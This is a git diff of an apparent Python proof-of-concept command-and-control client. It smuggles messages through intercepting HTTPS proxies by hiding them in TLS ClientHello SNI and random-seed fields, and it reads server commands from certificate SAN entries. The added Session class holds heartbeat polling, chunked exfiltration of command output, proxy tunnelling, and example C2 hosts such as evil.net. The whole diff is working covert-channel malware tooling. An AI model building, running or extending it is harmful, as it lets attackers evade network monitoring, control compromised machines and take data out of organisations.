@@ -7,41 +7,6 @@ PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS H
 
 """
 
-"""
-    PROTOCOL:
-
-    Use *TLS Random Seed Field* (32 bytes) for our 'Protocol Control Channel' - This is analogous to a TCP Segment Header
-
-    Length      Field
-    ------------------------
-    [2 bytes]   Client ID [max 65k clients] ;; TCP Analog: Source Port + Dest Port (Session ID)
-    [2 bytes]   Message Type (*** See Message Schema Below ***)
-    [8 bytes]   Sequence Number [Used for fragmentation: Max Total Message size = 2^32 * MAX_MSG_LEN ~ 1TB]
-    [16 bytes]  Checksum (CRC) - Integrety check on PAYLOAD
-"""
-
-"""
-    MESSAGE TYPE  (CLIENT):
-
-    Bytes       Message Type
-    \x00\x01    Heartbeat           # Simple heartbeat telling the Server we are up
-    \x00\x02    ACK                 # Last MSG acknowledged
-    \x01\x01    Response Complete   # Sent at end of a frangmented MSG or when MSG_LEN < MAX_MSG_LEN
-    \x01\x02    Response Fragment   # Sent if MSG_LEN > MAX_MSG_LEN and not last Fragment in sequence
-    \x01\x03    CRC Failed          # Tells the server to retransmit the Segment specified in Sequence num field
-    
-"""
-
-"""
-    MESSAGE TYPE  (SERVER):
-
-    Bytes       Message Type
-    \x00\x01    ACK                 # Last MSG acknowledged
-    \x00\x02    CMD Available       # Last MSG acknowledged
-    \x01\x01    Request Complete    # Sent at end of a frangmented MSG or when MSG_LEN < MAX_MSG_LEN
-    \x01\x02    Request Frangment   # Sent if MSG_LEN > MAX_MSG_LEN and not last Fragment in sequence
-    
-"""
 
 """
     PAYLOAD:
@@ -49,7 +14,7 @@ PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS H
     Use *Client Hello Server Name Indication (SNI) Field* to smuggle Messages
 
     Format: {MESSAGE}.tld
-        Where `.tld` is a random generated TLD of MAX LEN 5 chars (5 bytes)
+        Where `.tld` is a random generated TLD of MAX LEN 4 chars (4 bytes)
 
     NOTE: MAX LEN of an SNI FIELDS is 255 bytes. Our random TLD consumes 5 of those bytes (including the '.' char)
         Thus, MAX_MSG_LEN = 250 bytes
@@ -73,17 +38,24 @@ import typing
 import random
 import string
 import math
-import subprocess
+import threading
 import re
+import sys
+
+from protocol import *
 
 NS_TO_MS = 1000000
-# MAX_MSG_LEN to include max random TLD_LEN:
-MAX_MSG_LEN = 255
-is_connected = False
+MAX_SNI_LEN = 255  # MAX LEN of SNI field value
+MAX_TLD_LEN = 4  # Our random TLD generator max char length
+SNI_PADDING_LEN = 3  # To have an RFC Compliant hostname, nodes can be no longer than 63 chars
+MAX_MSG_LEN = MAX_SNI_LEN - MAX_TLD_LEN - SNI_PADDING_LEN - 1  # == 247 bytes
+
+POLL_INTERVAL = 10  # seconds for how often we send a heartbeat to the server
+MAX_RETRIES = 5  # Max num of times we will retry sending a message before giving up
 
 
-class TLSClientHandshake:
-    record = [  # idx  type     description
+class Session:
+    tls_client_hello = [  # idx  type     description
         b"\x16",  # [00] fixed    Record Type: TLS Handshake
         b"\x03\x01",  # [01] fixed    TLS REcord Version: v1.0
         b"\x00\x00",  # [02] variable Record Length: uint16
@@ -100,7 +72,7 @@ class TLSClientHandshake:
         b"\x01",  # [13] fixed    Compression Methods List Len
         b"\x00",  # [14] fixed    Compression = null
         b"\x00\x00",  # [15] variable Extensions Length: uint16
-        b"\x00",  # [16] variable Extension: SNI (object)         252 Bytes [SMUGGLE]
+        b"\x00",  # [16] variable Extension: SNI (object)         255 Bytes [SMUGGLE]
         b"\x00",  # [17] fixed    Extension: Elliptic Formats
         b"\x00",  # [18] fixed    Extension: Elliptic Groups
         b"\x00\x10",  # [19] variable Extension: Elliptic Alogorithms
@@ -108,29 +80,200 @@ class TLSClientHandshake:
         b"",  # [21] unused   -
     ]
 
-    def __init__(self, message: str):
-        enc_message, seed = self.encode_tls_payload(message)
-        if len(enc_message) > MAX_MSG_LEN:
+    def __init__(self, server=None, proxy=None):
+        """
+        Establishes a new C2 Session with the server specified.
+        Returns an a C2Session instance.
+
+        Pass in server= as an host:port str, Ex: "server=evil.net:443"
+        Pass in proxy= as an URL str, Ex: "http://proxy.corp.net:8080/"
+
+        1. First establishing a proxy CONNECT (if not direct)
+        2. Assigned ourself a random client id string
+        3. Attempt a CONNECT reqest with the C2 Server
+        4. Set is_connect and result_msg accordingly
+        5. Return our instance, reguardless of result
+        """
+        # init some variables
+        self.proxy = ""
+        self.server = ""
+        self.tcp_socket = None
+        self.connect_function = None
+        self.connect_args = []
+        self.is_connected = False
+        self.result_msg = ""
+        self.is_heartbeat_active = False
+        self.heartbeat_thread = None
+        self.heartbeats_missed = 0
+        self.rtt_ms = 0  # round trip time to send and recv and ack for our message
+        self.bytes_sent = 0
+        self.client_id = b""
+        self.last_poll_time = 0
+        init_result = self._connect_init(server, proxy)
+        if not init_result:
+            return
+        #
+        # Send CONNECT to server to establish protocol level communication
+        #
+        # set our connect message
+        self._set_tls_client_hello(ClientMessage().connect(), self._get_random_sni())
+        # send it!!
+        response = self._send_message()
+        if not response:
+            return
+        # Check server response bytes; First extract our protocol msg in random seed field
+        proto_header = self._get_protocol_header(response)
+        # Now parse our header
+        # The Server tells us what our client ID will be
+        self.client_id = Message().get_client_id(proto_header)
+        if Message().get_msg_type(proto_header) != ServerMessage.ACK:
+            self.result_msg = "Did not recieve an ACK message in response to our CONNECT request"
+            print(str(proto_header.hex()))
+            print(str(Message().get_msg_type(proto_header).hex()))
+            # print(str(ServerMessage.ACK))
+            # print(len(proto_header))
+        else:
+            self.is_connected = True
+        if self.is_connected:
+            self.last_poll_time = time.ctime()
+            # We should now have an established connection to our C2 Server now!
+            self.result_msg = "OK"
+            # Start up our Heatbeat in a seperate thread
+            self.heartbeat_thread = threading.Thread(target=self._poll, daemon=True)
+            self.is_heartbeat_active = True
+            self.heartbeat_thread.start()
+
+    # end __init__()
+
+    def _connect_init(self, server: str, proxy: str) -> bool:
+        if not server:
+            self.result_msg = "No C2 Server was specified"
+            return False
+        if not proxy:
+            self.connect_func = self._connect_direct
+            self.connect_args = [server]
+        else:
+            self.connect_func = self._connect_proxy
+            self.connect_args = [proxy, server]
+        self.proxy = proxy
+        self.server = server
+        return True
+
+    def _connect_wrapper(self) -> bool:
+        """All this does is abstract our which connection method to use, direct or via proxy"""
+        prox_start_time_ns = int(time.time_ns())
+        connect_result = self.connect_func(*self.connect_args)
+        self.rtt_ms = int((int(time.time_ns()) - prox_start_time_ns) / NS_TO_MS)
+        if not connect_result or type(self.tcp_socket) != socket.socket:
+            self.result_msg = "Failed to establish TCP connection to C2 Server!"
+            return False
+        return True
+
+    def _poll(self) -> None:
+        """Periodically sends heartbeat or poll messages to the C2 server"""
+        while True:
+            time.sleep(POLL_INTERVAL)
+            if self.is_heartbeat_active:
+                self._set_tls_client_hello(ClientMessage().heartbeat(self.client_id), self._get_random_sni())
+                response = self._send_message()
+                proto_header = self._get_protocol_header(response)
+                msg_type = Message().get_msg_type(proto_header)
+                if msg_type != ServerMessage.ACK and msg_type != ServerMessage.CMD_AVAILABLE:
+                    self.heartbeats_missed += 1
+                    self.result_msg = f"Missed {self.heartbeats_missed} heartbeat messages"
+                else:
+                    self.result_msg = "OK"
+                    self.heartbeats_missed = 0
+                    self.last_poll_time = time.ctime()
+                    self.is_connected = True
+                if self.heartbeats_missed > 4:
+                    self.heartbeats_missed = 0
+                    self.is_connected = False
+                # Check if the server wants us to do anything
+                if msg_type == ServerMessage.CMD_AVAILABLE:
+                    # grab whatever is in the SNI and send it to the API
+                    api_result = API.client_handle(self._parse_server_hello(response))
+                    self.send(api_result)
+
+    def send(self, message: bytes) -> bool:
+        """This is our abstracted sender method
+        It takes bytes, stuffs it into the SNI in the correct format
+        Chucks as needed, does CRC magic and all that.
+
+        It only send RESPONSE or FRAGMENT type messages. For example;
+            The server asks for a directly listing `ls`
+            We would call Session.send(cmd_output.encode())
+            This fuction handles eveything else.
+
+        Return bool if message was sent successful or not.
+        """
+        if not self.is_connected:
+            return False
+        self.is_heartbeat_active = False  # pause our polling thread until we are done sending our msg
+        total_rtt = 0
+        # TODO: This function takes a bytes object, which means if `message` is LARGE.. that lives in memory for a time
+        # TODO: Need to code up a sender that will stream chunks, and thus consume far less memory. (complicated)
+        chunks = [message[i : i + MAX_MSG_LEN] for i in range(0, len(message), MAX_MSG_LEN)]
+        chunks_last_index = len(chunks) - 1
+        smuggle = Message()
+        smuggle.header = self.client_id
+        for k, v in enumerate(chunks):
+            if k == chunks_last_index:
+                smuggle.header = smuggle.header + ClientMessage.RESPONSE
+            else:
+                smuggle.header = smuggle.header + ClientMessage.FRAGMENT
+            smuggle.body = (
+                struct.pack(">L", len(v))
+                + struct.pack(">L", k)
+                + struct.pack(">L", smuggle.compute_crc(v))
+                + smuggle.padding
+            )
+            self._set_tls_client_hello(smuggle, self._make_sni(v))
+            for i in range(MAX_RETRIES):
+                if i == MAX_RETRIES - 1:
+                    self.result_msg("Failed to resend message - Max retries reached")
+                    return False
+                response = self._send_message()
+                proto_header = self._get_protocol_header(response)
+                msg_typ = Message.get_msg_type(proto_header)
+                if msg_typ == ServerMessage.CRC_ERROR:
+                    continue
+                if msg_typ != ServerMessage.ACK:
+                    self.result_msg("Server responded with an unexpected message: " + str(msg_typ))
+                    return False
+                break
+            # end for(retries)
+            total_rtt = total_rtt + self.rtt
+        # end for(chunks)
+        self.rtt = total_rtt
+        self.bytes_sent = len(message)
+        return True
+
+    def _set_tls_client_hello(self, header: bytes, body: bytes) -> None:
+        if len(body) > MAX_MSG_LEN:
             print(
-                f"ERROR: Encoded message length of {len(enc_message)} (original length was {len(message)}) exceeds MAX_LEN of {MAX_MSG_LEN}"
+                f"ERROR: Encoded message length of {len(body)} (original length was {len(body)}) exceeds MAX_LEN of {MAX_MSG_LEN}"
             )
             raise NotImplementedError
-        self.record[20] = self.get_alpn()
-        self.record[19] = self.get_ec_algorithms()
-        self.record[18] = self.get_ec_groups()
-        self.record[17] = self.get_ec_formats()
-        self.record[16] = enc_message
-        # self.record[16] = self._fixed_sni()
-        self.record[15] = struct.pack(">H", len(b"".join(self.record[16:])))
-        self.record[12] = self.get_cipher_suites()
-        self.record[11] = struct.pack(">H", len(self.record[12]))
+        self.tls_client_hello[20] = self._get_alpn()
+        self.tls_client_hello[19] = self._get_ec_algorithms()
+        self.tls_client_hello[18] = self._get_ec_groups()
+        self.tls_client_hello[17] = self._get_ec_formats()
+        self.tls_client_hello[16] = body
+        # self.tls_client_hello[16] = self._fixed_sni()
+        # TODO: We may have Endianess issues here on other platforms...
+        #   This because struct pulls its long, int etc from compiled C types where byte order matters
+        self.tls_client_hello[15] = struct.pack(">H", len(b"".join(self.tls_client_hello[16:])))
+        self.tls_client_hello[12] = self._get_cipher_suites()
+        self.tls_client_hello[11] = struct.pack(">H", len(self.tls_client_hello[12]))
         # TODO: in the future, we will use seed field to smuggle payloads
-        self.record[8] = seed[4:]
-        self.record[7] = seed[:4]
-        self.record[5] = struct.pack(">L", len(b"".join(self.record[6:])))[1:]
-        self.record[2] = struct.pack(">H", len(b"".join(self.record[3:])))
+        self.tls_client_hello[8] = header[4:]
+        self.tls_client_hello[7] = header[:4]
+        self.tls_client_hello[5] = struct.pack(">L", len(b"".join(self.tls_client_hello[6:])))[1:]
+        self.tls_client_hello[2] = struct.pack(">H", len(b"".join(self.tls_client_hello[3:])))
 
-    def encode_tls_payload(self, message: str) -> typing.Tuple[bytes, bytes]:
+    # TODO: IS this func even being used ???
+    def _encode_tls_payload(self, message: str) -> typing.Tuple[bytes, bytes]:
         """
         Takes a string message and returns a Tuple of bytes cooresponding to SNI and random field in the TLS record
         """
@@ -142,10 +285,14 @@ class TLSClientHandshake:
         # hex_msg = ".".join(sliced)
         sni_tld = self._get_random_tld()
         # TODO: make this more robust - Use random seed field for smuggling
-        return (self.make_sni(hex_msg + sni_tld), self._get_random_seed())
+        return (self._make_sni(hex_msg + sni_tld), self._get_random_seed())
+
+    def _get_random_sni(self) -> bytes:
+        host = "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(4, 24)))
+        return self._make_sni(host.encode())
 
     def _get_random_tld(self):
-        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, 4)))
+        return "." + "".join(random.choice(string.ascii_lowercase) for i in range(random.randint(2, MAX_TLD_LEN)))
 
     def _get_random_seed(self) -> bytes:
         return bytes([random.randrange(0, 256) for _ in range(0, 32)])
@@ -156,245 +303,267 @@ class TLSClientHandshake:
     def _hex_to_str(self, message: str) -> str:
         return bytes.fromhex(message.decode()).decode()
 
-    def to_byte_stream(self) -> bytes:
-        return b"".join(self.record)
+    def _to_byte_stream(self) -> bytes:
+        return b"".join(self.tls_client_hello)
 
     def __str__(self):
-        return str("".join(self._escape(b) for b in self.record))
+        return str("".join(self._escape(b) for b in self.tls_client_hello))
 
     def _escape(self, byte_arr: bytes) -> str:
         return "".join("\\x{:02x}".format(b) for b in byte_arr)
 
-    def print_lens(self):
+    def _print_lens(self):
         l = 0
-        for i, r in enumerate(self.record):
+        for i, r in enumerate(self.tls_client_hello):
             l += len(r)
             print(f"len(record[{i}])={len(r)}")
         print(f"Total Length: {l}")
 
-    def get_cipher_suites(self) -> bytes:
+    def _get_cipher_suites(self) -> bytes:
         return b"\xc0\x30\xc0\x2c\xc0\x2f\xc0\x2b\x00\x9f\x00\x9e\xc0\x28\xc0\x24\xc0\x14\xc0\x0a\xc0\x27\xc0\x23\xc0\x13\xc0\x09\x00\x9d\x00\x9c\x00\x3d\x00\x35\x00\x3c\x00\x2f\x00\xff"
 
-    def get_ec_algorithms(self) -> bytes:
+    def _get_ec_algorithms(self) -> bytes:
         return (
             b"\x00\x0d\x00\x16\x00\x14\x06\x01\x06\x03\x05\x01\x05\x03\x04\x01\x04\x03\x03\x01\x03\x03\x02\x01\x02\x03"
         )
 
-    def get_ec_groups(self) -> bytes:
+    def _get_ec_groups(self) -> bytes:
         return b"\x00\x0a\x00\x08\x00\x06\x00\x1d\x00\x17\x00\x18"
 
-    def get_ec_formats(self) -> bytes:
+    def _get_ec_formats(self) -> bytes:
         return b"\x00\x0b\x00\x02\x01\x00"
 
-    def get_alpn(self) -> bytes:
+    def _get_alpn(self) -> bytes:
         return b"\x00\x10\x00\x0b\x00\x09\x08http/1.1"
 
-    def _fixed_sni(self) -> bytes:
-        name = "test-tls-smuggle.code".encode()
-        hostname_len = struct.pack(">H", len(name))
-        list_len = struct.pack(">H", len(name) + 3)
-        ext_len = struct.pack(">H", len(name) + 5)
-        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name
+    def _make_sni(self, message: bytes) -> bytes:
+        hex_str = message.hex()
+        # Per RFC, a hostname cannot be longer than 63 chars. So seperate with '.' as needed
+        ".".join(hex_str[i : i + 63] for i in range(0, len(hex_str), 63))
+        hex_str = hex_str + self._get_random_tld()
+        str_len = len(hex_str)
+        hostname_len = struct.pack(">H", str_len)
+        list_len = struct.pack(">H", str_len + 3)
+        ext_len = struct.pack(">H", str_len + 5)
+        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + hex_str.encode()
 
-    def make_sni(self, message: str) -> bytes:
-        name = message.encode()
-        hostname_len = struct.pack(">H", len(name))
-        list_len = struct.pack(">H", len(name) + 3)
-        ext_len = struct.pack(">H", len(name) + 5)
-        return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name
+    def _connect_proxy(self, proxy: str, server: str) -> bool:
+        """Attempts to establish an HTTP session with the Proxy
+        Sets self.tcp_socket with the socket object and Returns the bool result
+        """
+        proxy_host = proxy.split(":")[0]
+        proxy_port = int(proxy.split(":")[1])
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if not self.is_connected:
+            print(f"[+] Connecting to proxy: {proxy_host} ...")
+        try:
+            sock.connect((proxy_host, proxy_port))
+        except Exception as e:
+            self.result_msg = str(e)
+            return False
+        port = 443
+        try:
+            port = server.split(":")[1]
+            server = server.split(":")[0]
+        except:
+            pass
+        c_str = "CONNECT " + server + ":" + str(port) + " HTTP/1.1\r\n\r\n"
+        if not self.is_connected:
+            print(f" > {c_str.rstrip()}")
+        sock.sendall(c_str.encode())
+        resp = sock.recv(1024)
+        resp_first_line = resp.decode().split("\r\n")[0]
+        if not self.is_connected:
+            print(" < " + resp_first_line)
+        # we expect and HTTP/200 for our CONNECT request
+        if int(resp.decode().split("\r\n")[0].split(" ")[1]) != 200:
+            sock.close()
+            print(f"Error: The proxy did not accept our connect request; Got '{resp_first_line}'")
+            return False
+        self.tcp_socket = sock
+        return True
 
+    def _connect_direct(self, server: str) -> bool:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        if not self.is_connected:
+            print(f"[+] Connecting DIRECT: {server} ...")
+        port = 443
+        try:
+            port = server.split(":")[1]
+            server = server.split(":")[0]
+        except Exception as e:
+            self.result_msg = str(e)
+            return False
+        try:
+            sock.connect((server, int(port)))
+        except Exception as e:
+            self.result_msg = str(e)
+            return False
+        if type(sock) != socket.socket:
+            self.result_msg = "Could not socket connect to server in: _connect_direct()"
+            return False
+        self.tcp_socket = sock
+        return True
 
-# end class TLSClientHandshake()
+    def _send_message(self) -> bytes:
+        """
+        Sends a msg to the C2 server, the message in this case was set in `self.tls_client_hello`
+        Remember that our overall TCP/TLS connection is STATELESS
+        We are wrapping this stateless protocol in our own stateful one.
+        Therefore, every single REQUEST/RESPONSE is stateless to the outside protocol
+        """
+        start = int(time.time_ns())
+        if not self._connect_wrapper():
+            return b""
+        self.tcp_socket.sendall(b"".join(self.tls_client_hello))
+        response_data = b""
+        response_data = self.tcp_socket.recv(16384)
+        # So ya, we teardown the TCP socket after every REQ/RESP
+        self.tcp_socket.close()
+        self.rtt = int((int(time.time_ns()) - start) / NS_TO_MS)
+        return response_data
 
+    def _parse_server_hello(self, response_bytes: bytes) -> bytes:
+        """Extracts SAN message from response bytes; Returns bytes"""
+        hex_str = response_bytes.hex()
+        hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
+        position = self._validate_handshake_msg(hex_str, hex_array)
+        if position < 1:
+            print(f"[!] Failed to parse Response - Not a valid TLS Hanshake message!")
+            return ""
+        san_records_hex = self._find_san_records(self._extract_certs(hex_array, position))
+        message = ""
+        for hex_record in san_records_hex:
+            message = message + bytes.fromhex("".join(bytes.fromhex(hex_record).decode().split(".")[:-1]))
+        return message
 
-def connect_proxy(proxy_host: str, proxy_port: int, server: str) -> socket.socket:
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    if not is_connected:
-        print(f"[+] Connecting to proxy: {proxy_host} ...")
-    sock.connect((proxy_host, proxy_port))
-    port = 443
-    try:
-        port = server.split(":")[1]
-        server = server.split(":")[0]
-    except:
-        pass
-    c_str = "CONNECT " + server + ":" + str(port) + " HTTP/1.1\r\n\r\n"
-    if not is_connected:
-        print(f" > {c_str.rstrip()}")
-    sock.sendall(c_str.encode())
-    resp = sock.recv(1024)
-    resp_first_line = resp.decode().split("\r\n")[0]
-    if not is_connected:
-        print(" < " + resp_first_line)
-    # we expect and HTTP/200 for our CONNECT request
-    if int(resp.decode().split("\r\n")[0].split(" ")[1]) != 200:
-        sock.close()
-        print(f"Error: The proxy did not accept our connect request; Got '{resp_first_line}'")
-        return None
-    return sock
-
-
-def connect_direct(server: str) -> socket.socket:
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    if not is_connected:
-        print(f"+ Connecting DIRECT: {server} ...")
-    port = 443
-    try:
-        port = server.split(":")[1]
-        server = server.split(":")[0]
-    except:
-        pass
-    sock.connect((server, int(port)))
-    return sock
-
-
-def send_message(sock: socket.socket, byte_stream: bytes) -> bytes:
-    sock.sendall(byte_stream)
-    response_data = b""
-    response_data = sock.recv(16384)
-    # while True:
-    #     chunck = sock.recv(2)
-    #     if chunck:
-    #         response_data = response_data + chunck
-    #     else:
-    #         break
-    return response_data
-
-
-def parse_server_hello(response_bytes: bytes) -> str:
-    """Extracts SAN message from response bytes"""
-    # TODO: write this!
-    hex_str = response_bytes.hex()
-    hex_array = [hex_str[i : i + 2] for i in range(0, len(hex_str), 2)]
-    position = _validate_handshake_msg(hex_str, hex_array)
-    if position < 1:
-        print(f"[!] Failed to parse Response - Not a valid TLS Hanshake message!")
-        return ""
-    san_records_hex = _find_san_records(_extract_certs(hex_array, position))
-    message = ""
-    for hex_record in san_records_hex:
-        message = message + bytes.fromhex(bytes.fromhex(hex_record).decode().split(".")[0]).decode()
-    return message
-
-
-def _validate_handshake_msg(hex_str: str, hex_array: list) -> int:
-    is_valid_handshake = True
-    position = 0
-    # For each TLS record
-    # print(hex_str)
-    # try:
-    current_obj_len = 0
-    handshake_len = 0
-    if hex_str[0:2] != "16":
-        is_valid_handshake = False
-    if hex_str[2:4] != "03":
-        is_valid_handshake = False
-    if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
-        is_valid_handshake = False
-    max_len = int(math.pow(2, 15))
-    handshake_len = int(hex_str[6:10], 16)
-    if (handshake_len < 1) or (handshake_len > max_len):
-        is_valid_handshake = False
-    if hex_str[10:12] != "0b":
-        # If not a Certificate type message
-        # is_valid_handshake = False
-        current_obj_len = int(hex_str[12:18], 16)
-        if (current_obj_len < 1) or (current_obj_len > max_len):
+    def _get_protocol_header(self, response_bytes: bytes) -> bytes:
+        """Extracts random seed field (our protocol headers) from a TLS Server Hello"""
+        hex_str = response_bytes.hex()
+        is_valid_handshake = True
+        handshake_len = 0
+        if hex_str[0:2] != "16":
             is_valid_handshake = False
-        # assume nested record
-        position = 1 + 2 + 2 + current_obj_len + 3 + 1
-        if hex_array[position] != "0b":
-            # it's possible this is an un-nested tls recoard layer
-            if "".join(hex_array[position : position + 3]) == "160303":
-                return _validate_handshake_msg("".join(hex_array[position:]), hex_array[position:])
+        if hex_str[2:4] != "03":
+            is_valid_handshake = False
+        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
+            is_valid_handshake = False
+        max_len = int(math.pow(2, 15))
+        handshake_len = int(hex_str[6:10], 16)
+        if (handshake_len < 1) or (handshake_len > max_len):
+            is_valid_handshake = False
+        if hex_str[10:12] != "02":
+            is_valid_handshake = False
+        # hex_str[12:18] is the handshake len
+        # hex_str[18:20] is the tls handshake version
+        if not is_valid_handshake:
+            return b""
+        return bytes.fromhex(hex_str[22 : 22 + (32 * 2)])
+
+    def _validate_handshake_msg(self, hex_str: str, hex_array: list) -> int:
+        is_valid_handshake = True
+        position = 0
+        # For each TLS record
+        # print(hex_str)
+        # try:
+        current_obj_len = 0
+        handshake_len = 0
+        if hex_str[0:2] != "16":
+            is_valid_handshake = False
+        if hex_str[2:4] != "03":
+            is_valid_handshake = False
+        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
+            is_valid_handshake = False
+        max_len = int(math.pow(2, 15))
+        handshake_len = int(hex_str[6:10], 16)
+        if (handshake_len < 1) or (handshake_len > max_len):
+            is_valid_handshake = False
+        if hex_str[10:12] != "0b":
+            # If not a Certificate type message
+            # is_valid_handshake = False
+            current_obj_len = int(hex_str[12:18], 16)
+            if (current_obj_len < 1) or (current_obj_len > max_len):
+                is_valid_handshake = False
+            # assume nested record
+            position = 1 + 2 + 2 + current_obj_len + 3 + 1
+            if hex_array[position] != "0b":
+                # it's possible this is an un-nested tls recoard layer
+                if "".join(hex_array[position : position + 3]) == "160303":
+                    return self._validate_handshake_msg("".join(hex_array[position:]), hex_array[position:])
+            else:
+                position = position + 1
+                current_obj_len = int("".join(hex_array[position : position + 3]), 16)
+                position = position + 3
+                certs_len = int("".join(hex_array[position : position + 3]), 16)
         else:
+            current_obj_len = int(hex_str[12:18], 16)
             position = position + 1
             current_obj_len = int("".join(hex_array[position : position + 3]), 16)
             position = position + 3
             certs_len = int("".join(hex_array[position : position + 3]), 16)
-    else:
-        current_obj_len = int(hex_str[12:18], 16)
-        position = position + 1
-        current_obj_len = int("".join(hex_array[position : position + 3]), 16)
-        position = position + 3
+        if certs_len < 32:
+            is_valid_handshake = False
+        # except:
+        # is_valid_handshake = False
+        if not is_valid_handshake:
+            return -1
+        return position
+
+    def _extract_certs(self, hex_array: list, position: int) -> list:
+        cert_hex_arrays = []
         certs_len = int("".join(hex_array[position : position + 3]), 16)
-    if certs_len < 32:
-        is_valid_handshake = False
-    # except:
-    # is_valid_handshake = False
-    if not is_valid_handshake:
-        return -1
-    return position
-
-
-def _extract_certs(hex_array: list, position: int) -> list:
-    cert_hex_arrays = []
-    certs_len = int("".join(hex_array[position : position + 3]), 16)
-    position = position + 3
-    certs_handshake_position = 0
-    while certs_handshake_position < certs_len:
-        try:
-            cert_len = int("".join(hex_array[position : position + 3]), 16)
-        except:
-            break
         position = position + 3
-        cert_hex_arrays.append(hex_array[position : position + cert_len])
-        position = position + cert_len
-        certs_handshake_position = certs_handshake_position + 3 + cert_len
-    return cert_hex_arrays
-
-
-def _find_san_records(cert_list: list) -> list:
-    #    len          ext_type          len       len       len
-    # 30 37   06 03   [ 55 1d 11 ] 04   30    30  2e    82  1d [_SAN_] 82 06 [_SAN_] 82 05 [_SAN_] 30  ...
-    # TODO: WARN: Admittedly, this is a bit of a hack. We are manually parsing x509 certs. Which.. ya :(
-    # TODO: WARN: But I want to keep this code as lib-independant as possible. So, this is us, on the raggedy edge :/
-    san_records = []
-    for cert in cert_list:
-        if san_records:
-            break
-        hex_str = "".join(cert)
-        byte_position = [
-            (m.start(0), m.end(0))
-            for m in re.finditer("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
-        ][0][0]
-        san_record_matches = re.search("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
-        if len(san_record_matches.groups()) != 3:
-            continue
-        record_len = int(san_record_matches.groups()[2], 16)
-        byte_position += 22
-        while byte_position < (byte_position + record_len):
-            if hex_str[byte_position : byte_position + 2] != "82":
+        certs_handshake_position = 0
+        while certs_handshake_position < certs_len:
+            try:
+                cert_len = int("".join(hex_array[position : position + 3]), 16)
+            except:
                 break
-            byte_position += 2
-            dns_len = int(hex_str[byte_position : byte_position + 2], 16)
-            byte_position += 2
-            if dns_len < 1:
+            position = position + 3
+            cert_hex_arrays.append(hex_array[position : position + cert_len])
+            position = position + cert_len
+            certs_handshake_position = certs_handshake_position + 3 + cert_len
+        return cert_hex_arrays
+
+    def _find_san_records(self, cert_list: list) -> list:
+        #    len          ext_type          len       len       len
+        # 30 37   06 03   [ 55 1d 11 ] 04   30    30  2e    82  1d [_SAN_] 82 06 [_SAN_] 82 05 [_SAN_] 30  ...
+        # NOTE: Admittedly, this is a bit of a hack. We are manually parsing x509 certs. Which.. ya :(
+        # NOTE: But I want to keep this code as lib-independant as possible. So, this is us, on the raggedy edge :/
+        san_records = []
+        for cert in cert_list:
+            if san_records:
                 break
-            san_records.append(hex_str[byte_position : byte_position + dns_len * 2])
-            byte_position += dns_len * 2
-    return san_records
+            hex_str = "".join(cert)
+            byte_position = [
+                (m.start(0), m.end(0))
+                for m in re.finditer("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
+            ][0][0]
+            san_record_matches = re.search("30([0-9a-f]{2})0603551d1104([0-9a-f]{2})30([0-9a-f]{2})82", hex_str)
+            if len(san_record_matches.groups()) != 3:
+                continue
+            record_len = int(san_record_matches.groups()[2], 16)
+            byte_position += 22
+            while byte_position < (byte_position + record_len):
+                if hex_str[byte_position : byte_position + 2] != "82":
+                    break
+                byte_position += 2
+                dns_len = int(hex_str[byte_position : byte_position + 2], 16)
+                byte_position += 2
+                if dns_len < 1:
+                    break
+                san_records.append(hex_str[byte_position : byte_position + dns_len * 2])
+                byte_position += dns_len * 2
+        return san_records
 
 
-def check_for_command(msg: str) -> bool:
-    if msg in ["whoami", "hostname", "pwd"]:
-        return True
-
-
-def run_command(cmd: str) -> str:
-    return subprocess.check_output([cmd]).decode().rstrip()
-
-
-def _reset_socket(sock, func, *args):
-    sock.close()
-    return func(*args)
-
+# end class Session()
 
 if __name__ == "__main__":
+    # Grab our args from the CLI
     arg_parse = argparse.ArgumentParser(
         description="Send and Receive messages via TLS Handshakes through an interception proxy"
     )
-    arg_parse.add_argument("message", type=str, nargs="?", help="Message to send")
     arg_parse.add_argument(
         "-p",
         "--proxy",
@@ -423,21 +592,19 @@ if __name__ == "__main__":
         required=True,
         help="Target C2 Server you want to connect to, Example: my-server.evil.net",
     )
+    # Validate the the args provided
     args = arg_parse.parse_args()
-    if not args.message and not args.example:
-        arg_parse.error("Error: No message was supplied")
-        exit(1)
     if not args.proxy and not args.direct:
         arg_parse.error("Error: Either -d for direct connect or supply a valid --proxy argument")
         exit(1)
     if not args.server:
         arg_parse.error("Error: No server (--server) was supplied. Example: --server c2-server.evil.net:8443")
         exit(1)
+    proxy = None
+    proxy_hostname = proxy_scheme = ""
+    proxy_port = 0
     if args.proxy:
         is_good_proxy_url = True
-        proxy_scheme = ""
-        proxy_hostname = ""
-        proxy_port = ""
         try:
             proxy_scheme = args.proxy.lower().split(":")[0]
             proxy_hostname = args.proxy.lower().split("//")[1]
@@ -448,69 +615,32 @@ if __name__ == "__main__":
         if (proxy_scheme != "http") or (len(proxy_hostname) < 3) or (not proxy_port) or (not is_good_proxy_url):
             arg_parse.error("Error: The Supplied proxy URL appears invalid. Example: http://proxy.company.com:8080/")
             exit(1)
-    proxy_socket = None
-    connect_args = None
-    prox_end_time_ns = None
-    connect_func = None
-    if args.direct:
-        connect_func = connect_direct
-        connect_args = [args.server.lower()]
-    else:
-        connect_func = connect_proxy
-        connect_args = [proxy_hostname, proxy_port, args.server.lower()]
-    prox_start_time_ns = int(time.time_ns())
